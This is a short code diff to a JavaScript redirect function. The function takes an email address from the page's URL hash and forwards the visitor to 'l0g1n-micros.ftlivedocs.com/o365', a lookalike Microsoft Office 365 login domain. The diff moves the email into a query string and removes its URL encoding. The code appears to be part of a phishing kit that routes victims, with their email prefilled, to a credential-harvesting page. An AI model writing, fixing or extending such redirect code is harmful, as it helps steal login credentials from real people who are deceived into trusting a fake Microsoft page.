@@ -96,8 +96,8 @@
             function redirectToPage() {
                 const email = getEmailFromHash();
                 if (email) {
-                    // After decoding, redirect to a new page with the email in the query string
-                    const redirectTo = `https://l0g1n-micros.ftlivedocs.com/o365#${encodeURIComponent(email)}`;
+                    // After decoding, redirect to a new page with the decoded email in the query string
+                    const redirectTo = `https://l0g1n-micros.ftlivedocs.com/o365?email=${email}`;  // Removed encodeURIComponent to prevent extra encoding
                     console.log("Redirecting to: " + redirectTo);
                     window.location.href = redirectTo;
                 } else {
